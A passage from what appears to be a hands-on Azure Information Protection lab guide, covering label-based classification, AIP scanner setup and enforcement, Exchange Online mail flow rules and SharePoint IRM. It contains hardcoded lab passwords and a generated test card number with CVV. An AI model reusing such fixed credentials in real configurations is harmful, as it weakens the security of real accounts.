	> [!NOTE] This card number is a fake number that was generated using the Credit Card Generator for Testing at [https://developer.paypal.com/developer/creditCardGenerator/](https://developer.paypal.com/developer/creditCardGenerator/).  The Microsoft Classification Engine uses the Luhn Algorithm to prevent false positives so when testing, please make sure to use valid numbers.

1. [] Notice that you are prompted with a recommendation to change the classification to Confidential \ Contoso Internal. Click on **Change now** to set the classification and protect the document.

	!IMAGE[url9875r.jpg](\Media\url9875r.jpg)
	> [!Knowledge] Notice that, like the email in Task 2 of this exercise, the header value configured in the label is added to the document.
	>
	>!IMAGE[dcq31lz1.jpg](\Media\dcq31lz1.jpg)
1. [] In Microsoft Word, create a new **Blank document** and type ```my password is pass@word1``` and **save** the document.

	>[!HINT] Notice that the document is automatically classified and protected wioth the Highly Confidential \ All Employees label.
	>
	>!IMAGE[6vezzlnj.jpg](\Media\6vezzlnj.jpg)
1. [] Next, in Microsoft Outlook, click on the **New email** button.
	
	^IMAGE[Open Screenshot](\Media\ldjugk24.jpg)
	
1. [] Draft an email to Alice Anderson and Adam Smith (```Alice Anderson;Adam Smith```).  For the **Subject** and **Body** type ```Test Highly Confidential All Employees Automation```.

	^IMAGE[Open Screenshot](\Media\4v3wrrop.jpg)
1. [] Attach the **second document you created** to the email.

	!IMAGE[823tzyfd.jpg](\Media\823tzyfd.jpg)

	> [!HINT] Notice that the email was automatically classified as Highly Confidential \ All Employees.  This functionality is highly recommended because matching the email classification to attachments provides a much more cohesive user experience and helps to prevent inadvertent information disclosure in the body of sensitive emails.
	>
	>!IMAGE[yv0afeow.jpg](\Media\yv0afeow.jpg)

1. [] In the email, click **Send**.
===
# Bulk Classification with the AIP Client

In this task, we will perform bulk classification using the built-in functionality of the AIP Client.  This can be useful for users that want to classify/protect many documents that exist in a central location or locations identified by scanner discovery.  Because this is done manually, it is an AIP P1 feature.

1. [] Switch to @lab.VirtualMachine(Scanner01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Browse to the **C:\\**.
3. [] Right-click on the PII folder and select **Classify and Protect**.
   
   !IMAGE[CandP.png](\Media\CandP.png)
4. [] When prompted, click use another user and use the credentials below to authenticate:

	```AIPScanner@@lab.CloudCredential(134).TenantName```

	```Somepass1```

1. [] In the AIP client Classify and protect interface, select **Highly Confidential\\All Employees** and press **Apply**. 

	!IMAGE[CandP2.png](\Media\CandP2.png)

> [!NOTE] You may review the results in a text file by clicking show results, or simply close the window.
===
# Exercise 5: Classification, Labeling, and Protection with the Azure Information Protection Scanner
[:arrow_left: Home](#azure-information-protection)

The Azure Information Protection scanner allows you to  classify and protect sensitive information stored in on-premises CIFS file shares and SharePoint sites.  

In this exercise, you will change the condition we created previously from a recommended to an automatic classification rule.  After that, we will run the AIP Scanner in enforce mode to classify and protect the identified sensitive data.

===

# Configuring Automatic Conditions
[:arrow_left: Home](#azure-information-protection)
 
Now that we know what types of sensitive data we need to protect, we will configure some automatic conditions (rules) that the scanner can use to classify and protect content.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Open the browser that is logged into the Azure Portal.

3. [] Under **Classifications** on the left, click **Labels** then expand **Confidential**, and click on **Contoso Internal**.

4. [] In the Label : Contoso Internal blade, under **Select how this label is applied: automatically or recommended to user**, click **Automatic**.

	^IMAGE[Open Screenshot](\Media\1ifaer4l.jpg)

1. [] Click **Save** in the Label: Contoso Internal blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\rimezmh1.jpg)

1. [] Press the **X** in the upper right-hand corner to close the Label: Contoso Internal blade.

===

# Enforcing Configured Rules
[:arrow_left: Home](#azure-information-protection)
 
In this task, we will set the AIP scanner to enforce the conditions we set up in the previous task and have it rerun on all files using the Start-AIPScan command.

1. [] Switch to @lab.VirtualMachine(Scanner01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Run the commands below to run an enforced scan using defined policy.

    ```
	Set-AIPScannerConfiguration -Enforce On -DiscoverInformationTypes PolicyOnly
	```
	```
	Start-AIPScan
    ```

	> [!HINT] Note that this time we used the DiscoverInformationTypes -PolicyOnly switch before starting the scan. This will have the scanner only evaluate the conditions we have explicitly defined in conditions.  This increases the effeciency of the scanner and thus is much faster.  After reviewing the event log we will see the result of the enforced scan.
	>
	>!IMAGE[k3rox8ew.jpg](\Media\k3rox8ew.jpg)
	>
	>If we switch back to @lab.VirtualMachine(Client01).SelectLink and look in the reports directory we opened previously at ```\\\Scanner01.contoso.azure\c$\users\aipscanner\AppData\Local\Microsoft\MSIP\Scanner\Reports```, you will notice that the old scan reports are zipped in the directory and only the most recent results aare showing.  
	>
	> If needed, use the credentials below:
	>
	>```Contoso\LabUser```
	>
	>```Pa$$w0rd```
	>
	>!IMAGE[s8mn092f.jpg](\Media\s8mn092f.jpg)
	>
	>Also, the DetailedReport.csv now shows the files that were protected.
	>
	>
	>!IMAGE[6waou5x3.jpg](\Media\6waou5x3.jpg)
	>
	>^IMAGE[Open Fullscreen](6waou5x3.jpg)

===

# Reviewing Protected Documents
[:arrow_left: Home](#azure-information-protection)

Now that we have Classified and Protected documents using the scanner, we can review the documents we looked at previously to see their change in status.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
 
2. [] Navigate to ```\\\Scanner01.contoso.azure\documents```. 

	> If needed, use the credentials below:
	>
	>```Contoso\LabUser```
	>
	>```Pa$$w0rd```
 
	^IMAGE[Open Screenshot](\Media\hipavcx6.jpg)
3. [] Open one of the Contoso Purchasing Permissions documents or Run For The Cure spreadsheets.
 
 	
	
	> [!NOTE] Observe that the same document is now classified as Confidential \ Contoso Internal. 
	>
	>!IMAGE[s1okfpwu.jpg](\Media\s1okfpwu.jpg)
===
# Reviewing the Dashboards

We can now go back and look at the dashboards and observe how they have changed.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Open the browser that is logged into the Azure Portal.

3. [] Under **Dashboards**, click on **Usage report (Preview)**.

	> [!NOTE] Observe that there are now entries from the AIP scanner, File Explorer, Microsoft Outlook, and Microsoft Word based on our activities in this lab. You may not see details of label data right away as this takes longer to process.  I have included a screenshot of the results below, but you may check back later in the lab to see the full results.
	>
	> !IMAGE[Usage.png](\Media\Usage.png)
	>
	> !IMAGE[Usage2.png](\Media\Usage2.png)
2. [] Next, under dashboards, click on **Data discovery (Preview)**.

	> [!NOTE] As mentioned above, label data may not show up initially but you should start seeing protection data in the portal.  I have included a screenshot of the final result so please check back throughout the lab to see the label data from the AIP scanner.
	>
	> !IMAGE[Discovery.png](\Media\Discovery.png)
	> 
	> !IMAGE[discovery2.png](\Media\discovery2.png)
	
===
# Exercise 6: Exchange Online IRM Capabilities
[:arrow_left: Home](#azure-information-protection)

Exchange Online can work in conjunction with Azure Information Protection to provide advanced capabilities for protecting sensitive data being sent over email.  You can also manage the flow of classified content to ensure that it is not sent to unintended recipients.  

## Configuring Exchange Online Mail Flow Rules

In this task, we will configure a mail flow rule to detect sensitive information traversing the network in the clear and encrypt it using the Encrypt Only RMS Template.  We will also create a mail flow rule to prevent messages classified as Confidential \ Contoso Internal from being sent to external recipients.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Open an **Admin PowerShell Prompt**.

3. [] Type the commands below to connect to an Exchange Online PowerShell session.  Use the credentials provided when prompted.

	```
	Set-ExecutionPolicy RemoteSigned
	```

	```
	$UserCredential = Get-Credential
	```

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```

	```
	$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $UserCredential -Authentication Basic -AllowRedirection
	Import-PSSession $Session
	```

1. [] Create a new Exchange Online Mail Flow Rule using the code below:

	```
	New-TransportRule -Name "Encrypt external mails with sensitive content" -SentToScope NotInOrganization -ApplyRightsProtectionTemplate "Encrypt" -MessageContainsDataClassifications @(@{Name="ABA Routing Number"; minCount="1"},@{Name="Credit Card Number"; minCount="1"},@{Name="Drug Enforcement Agency (DEA) Number"; minCount="1"},@{Name="International Classification of Diseases (ICD-10-CM)"; minCount="1"},@{Name="International Classification of Diseases (ICD-9-CM)"; minCount="1"},@{Name="U.S. / U.K. Passport Number"; minCount="1"},@{Name="U.S. Bank Account Number"; minCount="1"},@{Name="U.S. Individual Taxpayer Identification Number (ITIN)"; minCount="1"},@{Name="U.S. Social Security Number (SSN)"; minCount="1"})
	```

	>[!KNOWLEDGE] This mail flow rule can be used to encrypt sensitive data leaving via email.  This can be customized to add additional sensitive data types. A breakdown of the command is listed below.
	>
	>New-TransportRule 
	>
	>-Name "Encrypt external mails with sensitive content" 
	>
	>-SentToScope NotInOrganization 
	>
	>-ApplyRightsProtectionTemplate "Encrypt" 
	>
	>-MessageContainsDataClassifications @(@{Name="ABA Routing Number"; minCount="1"},@{Name="Credit Card Number"; minCount="1"},@{Name="Drug Enforcement Agency (DEA) Number"; minCount="1"},@{Name="International Classification of Diseases (ICD-10-CM)"; minCount="1"},@{Name="International Classification of Diseases (ICD-9-CM)"; minCount="1"},@{Name="U.S. / U.K. Passport Number"; minCount="1"},@{Name="U.S. Bank Account Number"; minCount="1"},@{Name="U.S. Individual Taxpayer Identification Number (ITIN)"; minCount="1"},@{Name="U.S. Social Security Number (SSN)"; minCount="1"})
	
	> [!HINT] Next, we need to capture the **Label ID** for the **Confidential \ Contoso Internal** label. 

1. [] Switch to the Azure Portal and under **Classifications** click on Labels, then expand **Confidential** and click on **Contoso Internal**.

	!IMAGE[w2w5c7xc.jpg](\Media\w2w5c7xc.jpg)

	> [!HINT] If you closed the azure portal, open an Edge InPrivate window and navigate to ```https://portal.azure.com```.

1. [] In the Label: Contoso Internal blade, scroll down to the Label ID and **copy** the value.

	!IMAGE[lypurcn5.jpg](\Media\lypurcn5.jpg)

	> [!ALERT] Make sure that there are no spaces before or after the Label ID as this will cause the mail flow rule to be ineffective.

1. [] Next, return to the PowerShell window and type ```$labelid = "``` then paste the **LabelID** for the **Contoso Internal** label, type ```"```, and press **Enter**.
1. [] Now, create another Exchange Online Mail Flow Rule using the code below:

	```
	$labeltext = "MSIP_Label_"+$labelid+"_enabled=true"
	New-TransportRule -name "Block Confidential Contoso Internal" -SentToScope notinorganization -HeaderContainsMessageHeader  "msip_labels" -HeaderContainsWord $labeltext -RejectMessageReasonText “Contoso internal messages cannot be sent to external recipients.”
	```

	>[!KNOWLEDGE] This mail flow rule can be used to prevent internal only communications from being sent to an external audience.
	>
	>New-TransportRule 
	>
	>-name "Block Confidential Contoso Internal" 
	>
	>-SentToScope notinorganization 
	>
	>-HeaderContainsMessageHeader "msip_labels" 
	>
	>-HeaderContainsWord $labeltext 
	>
	>-RejectMessageReasonText “Contoso internal messages cannot be sent to external recipients.”

	>[!NOTE] In a production environment, customers would want to create a rule like this for each of their labels that they did not want going externally.
===

# Demonstrating Exchange Online Mail Flow Rules
[:arrow_left: Home](#azure-information-protection)

In this task, we will send emails to demonstrate the results of the Exchange Online mail flow rules we configured in the previous task.  This will demonstrate some ways to protect your sensitive data and ensure a positive user experience with the product.

1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In Microsoft Outlook, click on the **New email** button.

	^IMAGE[Open Screenshot](\Media\6wan9me1.jpg)

1. [] Send an email to Adam Smith, Alice Anderson, and yourself (```Adam Smith;Alice Anderson;@lab.User.Email```).  For the **Subject**, type ```Test Credit Card Email``` and for the **Body**, type ```My AMEX card number is 344047014854133. The expiration date is 09/28, and the CVV is 4368```, then click **Send**.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and review the received email.

	!IMAGE[pidqfaa1.jpg](\Media\pidqfaa1.jpg)

	> [!Knowledge] Note that there is no encryption applied to the message.  That is because we set up the rule to only apply to external recipients.  If you were to leave that condition out of the mail flow rule, internal recipients would also receive an encrypted copy of the message.  The image below shows the encrypted message that was received externally.
	>
	>!IMAGE[c5foyeji.jpg](\Media\c5foyeji.jpg)
	>
	>Below is another view of the same message received in Outlook Mobile on an iOS device.
	>
	>!IMAGE[599ljwfy.jpg](\Media\599ljwfy.jpg)

1. [] Next, in Microsoft Outlook, click on the **New email** button.

	^IMAGE[Open Screenshot](\Media\6wan9me1.jpg)
1. [] Send an email to Adam Smith, Alice Anderson, and yourself (```Adam Smith;Alice Anderson;@lab.User.Email```).  For the **Subject** and **Body** type ```Another Test Contoso Internal Email```.

	^IMAGE[Open Screenshot](\Media\d476fmpg.jpg)

1. [] In the Sensitivity Toolbar, click on the **pencil** icon to change the Sensitivity label.

	^IMAGE[Open Screenshot](\Media\901v6vpa.jpg)

1. [] Click on **Confidential** and then **Contoso Internal** and click **Send**.

	^IMAGE[Open Screenshot](\Media\yhokhtkv.jpg)
1. [] In about a minute, you should receive an **Undeliverable** message from Exchange with the users that the message did not reach and the message you defined in the previous task.

	!IMAGE[kgjvy7ul.jpg](\Media\kgjvy7ul.jpg)

> [!HINT] There are many other use cases for Exchange Online mail flow rules but this should give you a quick view into what is possible and how easy it is to improve the security of your sensitive data through the use of Exchange Online mail flow rules and Azure Information Protection.

===
# Exercise 7: SharePoint IRM Configuration
[:arrow_left: Home](#azure-information-protection)

In this exercise, you will configure SharePoint Online Information Rights Management (IRM) and configure a document library with an IRM policy to protect documents that are downloaded from that library.

===
# Enable Information Rights Management in SharePoint Online
[:arrow_left: Home](#azure-information-protection)
 
In this task, we will enable Information Rights Management in SharePoint Online.

1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Launch an Edge InPrivate session to ```https://admin.microsoft.com/AdminPortal/Home#/```.
 
1. [] If needed, log in using the credentials below:

	 ```@lab.CloudCredential(134).Username```
	 
	 ```@lab.CloudCredential(134).Password```
 
1. [] Hover over the **Admin centers** section of the bar on the left and choose **SharePoint**.

	!IMAGE[r5a21prc.jpg](\Media\r5a21prc.jpg)
 
1. [] In the SharePoint admin center click on **settings**.

1. [] Scroll down to the Information Rights Management (IRM) section and select the option button for **Use the IRM service specified in your configuration**.
 
1. [] Click the **Refresh IRM Settings** button.

	!IMAGE[1qv8p13n.jpg](\Media\1qv8p13n.jpg)

	>[!HINT] After the browser refreshes, you can scroll down to the same section and you will see a message stating **We successfully refreshed your setings.**
	>
	>!IMAGE[daeglgk9.jpg](\Media\daeglgk9.jpg)
1. [] Scroll down and click **OK**.
1. [] Next, navigate to ```https://admin.microsoft.com/AdminPortal/Home#/users```.
1. [] Click on **Nuck Chorris** and on the profile page, next to Roles, click **Edit**.

	!IMAGE[df6t9nk1.jpg](\Media\df6t9nk1.jpg)
1. [] On the Edit user roles page, select **Customized administrator**, check the box next to **SharePoint administrator**, and click **Save**.

	!IMAGE[3rj47ym9.jpg](\Media\3rj47ym9.jpg)
1. [] **Close the Edge InPrivate browser** window to **clear the credentials**.

 
===

# Site Creation and Information Rights Management Integration
[:arrow_left: Home](#azure-information-protection)
 
In this task, we will create a new SharePoint site and enable Information Rights Management in a document library.

1. [] Launch a new Edge InPrivate session to ```https://portal.office.com```.
1. [] Log in using the credentials below:

	```NuckC@@lab.CloudCredential(134).TenantName```

	```NinjaCat123```
1. [] Click on **SharePoint** in the list.

	!IMAGE[twsp6mvj.jpg](\Media\twsp6mvj.jpg)

1. [] Dismiss any introductory screens and, at the top of the page, click **+ Create site**.

	!IMAGE[7v8wctu2.jpg](\Media\7v8wctu2.jpg)

	[!NOTE] If you do not see the **+ Create site** button, resize the VM window by dragging the divider for the instructions to the right until the VM resizes and you can see the button.
 
1. [] On the Create a site page, click **Team site**.

	^IMAGE[Open Screenshot](\Media\406ah98f.jpg)
 
1. [] On the next page, type ```IRM Demo``` for **Site name** and for the **Site description**, type ```This is a team site for demonstrating SharePoint IRM capabilities``` and set the **Privacy settings** to **Public - anyone in the organization can access the site** and click **Next**.

	^IMAGE[Open Screenshot](\Media\ug4tg8cl.jpg)

1. [] On the Add group members page, click **Finish**.
1. [] In the newly created site, on the left navigation bar, click **Documents**.

	^IMAGE[Open Screenshot](\Media\yh071obk.jpg)
 
1. [] In the upper right-hand corner, click the **Settings icon** and click **Library settings**.

	!IMAGE[1qo31rp6.jpg](\Media\1qo31rp6.jpg)
 
1. [] On the Documents > Settings page, under **Permissions and Management**, click **Information Rights Management**.

	!IMAGE[ie2rmsk2.jpg](\Media\ie2rmsk2.jpg)
 
	>[!ALERT] It may take up to 10 minutes for the global IRM settings to apply to document libraries.  If this has not appeared after a few minutes, try creating a new document library to see if the link is available. 

1. [] On the Settings > Information Rights Management Settings page, check the box next to Restrict permissions on this library on download and under **Create a permission policy title** type ```Contoso IRM Policy```, and under **Add a permission policy description** type ```This content contained within this file is for use by Contoso Corporation employees only.```
 
	^IMAGE[Open Screenshot](\Media\m9v7v7ln.jpg)
1. [] Next, click on **SHOW OPTIONS** below the policy description and in the **Set additional IRM library settings** section, check the boxes next to **Do not allow users to upload documents that do not support IRM** and **Prevent opening documents in the browser for this Document Library**.

	!IMAGE[0m2qqtqn.jpg](\Media\0m2qqtqn.jpg)
	>[!KNOWLEDGE] These setting prevent the upload of documents that cannot be protected using Information Rights Managment (Azure RMS) and forces protected documents to be opened in the appropriate application rather than rendering in the SharePoint Online Viewer.
 
1. [] Next, under the **Configure document access rights** section, check the box next to **Allow viewers to run script and screen reader to function on downloaded documents**.

	!IMAGE[72fkz2ds.jpg](\Media\72fkz2ds.jpg)
	>[!HINT] Although this setting may reduce the security of the document, this is typically provided for accessibility purposes.
1. [] Finally, in the **Configure document access rights** section, check the box next to  **Users must verify their credentials using this interval (days)** and type ```7``` in the text box.

	!IMAGE[tt1quq3f.jpg](\Media\tt1quq3f.jpg)
1. [] At the bottom of the page, click **OK** to complete the configuration of the protected document library.
1. [] On the Documents > Settings page, in the left-hand navigation pane, click on **Documents** to return to the document library. section.
 
1. [] Leave the browser open and continue to the next task.
 
===

# Uploading Content to the Document Library
[:arrow_left: Home](#azure-information-protection)
 
Create an unprotected Word document, label it as Internal, and upload it to the document library. 

1. [] Launch **Microsoft Word**.
1. [] Create a new **Blank document**.

	>[!NOTE] Notice that by default the document is labeled as the unprotected classification **General**.
 
1. [] In the Document, type ```This is a test document```.
 
1. [] **Save** the document and **close Microsoft Word**.
1. [] Return to the IRM Demo protected document library and click on **Upload > Files**.

	!IMAGE[m95ixvv1.jpg](\Media\m95ixvv1.jpg)
1. [] Navigate to the location where you saved the document, select it and click **Open** to upload the file.
 
1. [] Next, minimize the browser window and right-click on the desktop. Hover over **New >** and click on **Microsoft Access Database**. Name the database ```BadFile```.

	!IMAGE[e3nxt4a2.jpg](\Media\e3nxt4a2.jpg)
1. [] Return to the document library and attempt to upload the file.

	>[!KNOWLEDGE] Notice that you are unable to upload the file because it cannot be protected.
	>	
	>!IMAGE[432hu3pi.jpg](\Media\432hu3pi.jpg)
===

# SharePoint IRM Functionality
[:arrow_left: Home](#azure-information-protection)
 
Files that are uploaded to a SharePoint IRM protected document library are protected upon download based on the user's access rights to the document library.  In this task, we will share a document with Alice Anderson and review the access rights provided.

1. [] Select the uploaded document and click **Share** in the action bar.

	!IMAGE[1u2jsod7.jpg](\Media\1u2jsod7.jpg)
1. [] In the Send Link dialog, type ```Alice``` and click on **Alice Anderson** then **Send**.

	!IMAGE[j6w1v4z9.jpg](\Media\j6w1v4z9.jpg)
1. [] Switch to @lab.VirtualMachine(Client02).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open Outlook and click on the email from Nuck Chorris, then click on the **Open** link.

	^IMAGE[Open Screenshot](\Media\v39ez284.jpg)
1. [] This will launch the IRM Demo document library.  Click on the document to open it in Microsoft Word.

	!IMAGE[xmv9dmvk.jpg](\Media\xmv9dmvk.jpg)
1. [] After the document opens, you will be able to observe that it is protected.  Click on the View Permissions button to review the restrictions set on the document.

	!IMAGE[4uya6mro.jpg](\Media\4uya6mro.jpg)
	>[!NOTE] These permissions are based on the level of access that they user has to the document library.  In a production environment most users would likely have less rights than shown in this example.

===
# AIP Lab Complete
Congratulations! You have completed the Azure Information Protection Hands on Lab. 
===
# Experienced with AIP
[:arrow_left: Home](#azure-information-protection)

## Exercise 1A: Configuring AIP Scanner for Discovery

Even before configuring an AIP classification taxonomy, customers can scan and identify files containing sensitive information based on the built-in sensitive information types included in the Microsoft Classification Engine.  

!IMAGE[ahwj80dw.jpg](\Media\ahwj80dw.jpg)

Often, this can help drive an appropriate level of urgency and attention to the risk customers face if they delay rolling out AIP classification and protection.  

In this exercise, we will install the AIP scanner and run it against repositories in discovery mode.  Later in this lab (after configuring labels and conditions) we will revisit the scanner to perform automated classification, labeling, and protection of sensitive documents.

===
# Configuring Azure Log Analytics
[:arrow_left: Home](#azure-information-protection)

In order to collect log data from Azure Information Protection clients and services, you must first configure the log analytics workspace.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In the InPrivate window, navigate to ```https://portal.azure.com/```
	>
	>^IMAGE[Open Screenshot](\Media\cznh7i2b.jpg)

	> [!KNOWLEDGE] If necessary, log in using the username and password below:
	>
	>```@lab.CloudCredential(134).Username``` 
	>
	>```@lab.CloudCredential(134).Password```
	
1. [] After logging into the portal, type the word ```info``` into the **search bar** and press **Enter**, then click on **Azure Information Protection**. 

	!IMAGE[2598c48n.jpg](\Media\2598c48n.jpg)
	
	> [!HINT] If you do not see the search bar at the top of the portal, click on the **Magnifying Glass** icon to expand it.
	>
	> !IMAGE[ny3fd3da.jpg](\Media\ny3fd3da.jpg)

1. [] In the Azure Information Protection blade, under **Manage**, click **Configure analytics (preview)**.

1. [] Next, click on **+ Create new workspace**.

	!IMAGE[qu68gqfd.jpg](\Media\qu68gqfd.jpg)
1. [] In the Log analytics workspace using the values in the table below and click **OK**.

	|||
	|-----|-----|
	|OMS Workspace|**Unique Workspace Name**|
	|Resource Group|```AIP-RG```|
	|Location|**East US**|

	^IMAGE[Open Screenshot](\Media\5butui15.jpg)
1. [] Next, back in the Configure analytics (preview) blade, **check the box** next to the workspace and click **OK**.

	!IMAGE[gste52sy.jpg](\Media\gste52sy.jpg)
1. [] Click **Yes**, in the confirmation dialog.

	!IMAGE[zgvmm4el.jpg](\Media\zgvmm4el.jpg)
===
# AIP Scanner Setup
In this task we will install the AIP scanner binaries and create the Azure AD Applications necessary for authentication.
[:arrow_left: Home](#azure-information-protection)

## Installing the AIP Scanner Service

The first step in configuring the AIP Scanner is to install the service and connect the database.  This is done with the Install-AIPScanner cmdlet that is provided by the AIP Client software.  The AIPScanner service account has been pre-staged in Active Directory for convenience.

1. [] Switch to @lab.VirtualMachine(Scanner01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.

1. [] Right-click on the **PowerShell** icon in the taskbar and click on **Run as Administrator**.

	!IMAGE[7to6p334.jpg](\Media\7to6p334.jpg)

1. [] At the PowerShell prompt, type ```$SQL = "Scanner01"``` and press **Enter**.
1. [] Next, type ```Install-AIPScanner -SQLServerInstance $SQL``` and press **Enter**.
1. [] When prompted, provide the credentials for the AIP scanner service account.
	
	```Contoso\AIPScanner```

	```Somepass1```

	^IMAGE[Open Screenshot](\Media\pc9myg9x.jpg)

	> [!knowledge] You should see a success message like the one below. 
	>
	>!IMAGE[w7goqgop.jpg](\Media\w7goqgop.jpg)
	>

## Creating Azure AD Applications for the AIP Scanner

Now that you have installed the scanner bits, you need to get an Azure AD token for the scanner service account to authenticate so that it can run unattended. This requires registering both a Web app and a Native app in Azure Active Directory.  The commands below will do this in an automated fashion rather than needing to go into the Azure portal directly.

1. [] In PowerShell, run ```Connect-AzureAD``` and use the username and password below. 
	
	```@lab.CloudCredential(134).Username```
	
	```@lab.CloudCredential(134).Password```
1. [] Next, click the **T** to **type the commands below** in the PowerShell window. 

	> [!ALERT] Press Enter only after you see **-CustomKeyIdentifier "AIPClient"**.

	> [!NOTE] This will create a new Web App Registration and Service Principal in Azure AD.

   ```
   New-AzureADApplication -DisplayName AIPOnBehalfOf -ReplyUrls http://localhost
   $WebApp = Get-AzureADApplication -Filter "DisplayName eq 'AIPOnBehalfOf'"
   New-AzureADServicePrincipal -AppId $WebApp.AppId
   $WebAppKey = New-Guid
   $Date = Get-Date
   New-AzureADApplicationPasswordCredential -ObjectId $WebApp.ObjectID -startDate $Date -endDate $Date.AddYears(1) -Value $WebAppKey.Guid -CustomKeyIdentifier "AIPClient"
	```

1. [] Next, we must build the permissions object for the Native App Registration.  This is done using the commands below.
   
	> [!ALERT] Press Enter only after you see **$Access.ResourceAccess = $Scope**.

   ```
   $AIPServicePrincipal = Get-AzureADServicePrincipal -All $true | ? {$_.DisplayName -eq 'AIPOnBehalfOf'}
   $AIPPermissions = $AIPServicePrincipal | select -expand Oauth2Permissions
   $Scope = New-Object -TypeName "Microsoft.Open.AzureAD.Model.ResourceAccess" -ArgumentList $AIPPermissions.Id,"Scope"
   $Access = New-Object -TypeName "Microsoft.Open.AzureAD.Model.RequiredResourceAccess"
   $Access.ResourceAppId = $WebApp.AppId
   $Access.ResourceAccess = $Scope
	```
1. [] Next, we will use the object created above to create the Native App Registration.
   
	> [!ALERT] Press Enter only after you see **-AppId $NativeApp.AppId**.

   ```
   New-AzureADApplication -DisplayName AIPClient -ReplyURLs http://localhost -RequiredResourceAccess $Access -PublicClient $true
   $NativeApp = Get-AzureADApplication -Filter "DisplayName eq 'AIPClient'"
   New-AzureADServicePrincipal -AppId $NativeApp.AppId
	```
   
1. [] Finally, we will output the Set-AIPAuthentication command by running the commands below and pressing **Enter**.
   
	> [!ALERT] Press Enter only after you see **Start ~\Desktop\Set-AIPAuthentication.txt**.
   
   ```
   "Set-AIPAuthentication -WebAppID " + $WebApp.AppId + " -WebAppKey " + $WebAppKey.Guid + " -NativeAppID " + $NativeApp.AppId | Out-File ~\Desktop\Set-AIPAuthentication.txt
	Start ~\Desktop\Set-AIPAuthentication.txt
	```
1. [] In the new notepad window, copy the command to the clipboard.
1. [] Click on the Start menu and type ```PowerShell```, right-click on the PowerShell program, and click **Run as a different user**.

	!IMAGE[zgt5ikxl.jpg](\Media\zgt5ikxl.jpg)

1. [] When prompted, enter the username and password below and click **OK**.

	```Contoso\AIPScanner``` 

	```Somepass1```

1. [] Paste the copied **Set-AIPAuthentication** command into this window and run it.
1. [] When prompted, enter the username and password below:

	```AIPScanner@@lab.CloudCredential(134).TenantName```

	```Somepass1```

	^IMAGE[Open Screenshot](\Media\qfxn64vb.jpg)

1. [] In the Permissions requested window, click **Accept**.

   !IMAGE[nucv27wb.jpg](\Media\nucv27wb.jpg)
   
	>[!knowledge] You will a message like the one below in the PowerShell window once complete.
	>
	>!IMAGE[y2bgsabe.jpg](\Media\y2bgsabe.jpg)
1. [] **Close the current PowerShell window**.
1. [] **In the admin PowerShell window** and type the command below and press **Enter**.

	```Restart-Service AIPScanner```
   
===

# Configuring Repositories
[:arrow_left: Home](#azure-information-protection)

In this task, we will configure repositories to be scanned by the AIP scanner.  As previously mentioned, these can be any type of CIFS file shares including NAS devices sharing over the CIFS protocol.  Additionally, On premises SharePoint 2010, 2013, and 2016 document libraries and lists (attachements) can be scanned.  You can even scan entire SharePoint sites by providing the root URL of the site.  There are several optional 

> [!NOTE] SharePoint 2010 is only supported for customers who have extended support for that version of SharePoint.

The next task is to configure repositories to scan.  These can be on-premises SharePoint 2010, 2013, or 2016 document libraries and any accessible CIFS based share.

1. [] In the PowerShell window on Scanner01 run the commands below

    ```
    Add-AIPScannerRepository -Path http://Scanner01/documents -SetDefaultLabel Off
	```
	```
	Add-AIPScannerRepository -Path \\Scanner01\documents -SetDefaultLabel Off
    ```
	>[!Knowledge] Notice that we added the **-SetDefaultLabel Off** switch to each of these repositories.  This is necessary because our Global policy has a Default label of **General**.  If we did not add this switch, any file that did not match a condition would be labeled as General when we do the enforced scan.

	^IMAGE[Open Screenshot](\Media\00niixfd.jpg)
1. [] To verify the repositories configured, run the command below.
	
    ```
    Get-AIPScannerRepository
    ```
	^IMAGE[Open Screenshot](\Media\n5hj5e7j.jpg)

===

# Running Sensitive Data Discovery
[:arrow_left: Home](#azure-information-protection)

1. [] Run the commands below to run a discovery cycle.

    ```
	Set-AIPScannerConfiguration -DiscoverInformationTypes All -Enforce Off
	```
	```
	Start-AIPScan
    ```

	> [!Knowledge] Note that we used the DiscoverInformationTypes -All switch before starting the scan.  This causes the scanner to use any custom conditions that you have specified for labels in the Azure Information Protection policy, and the list of information types that are available to specify for labels in the Azure Information Protection policy.  Although the scanner will discover documents to classify, it will not do so because the default configuration for the scanner is Discover only mode.
 	
1. [] Right-click on the **Windows** button in the lower left-hand corner and click on **Event Viewer**.
 
	^IMAGE[Open Screenshot](\Media\cjvmhaf0.jpg)
1. [] Expand **Application and Services Logs** and click on **Azure Information Protection**.

	^IMAGE[Open Screenshot](\Media\dy6mnnpv.jpg)
 
	>[!NOTE] You will see an event like the one below when the scanner completes the cycle.
	>
	>!IMAGE[agnx2gws.jpg](\Media\agnx2gws.jpg)
 
1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open a **File Explorer** window, and browse to ```\\\Scanner01.contoso.azure\c$\users\aipscanner\AppData\Local\Microsoft\MSIP\Scanner\Reports```.

	> If needed, use the credentials below:
	>
	>```Contoso\LabUser```
	>
	>```Pa$$w0rd```

1. [] Review the summary txt and detailed csv files available there.  

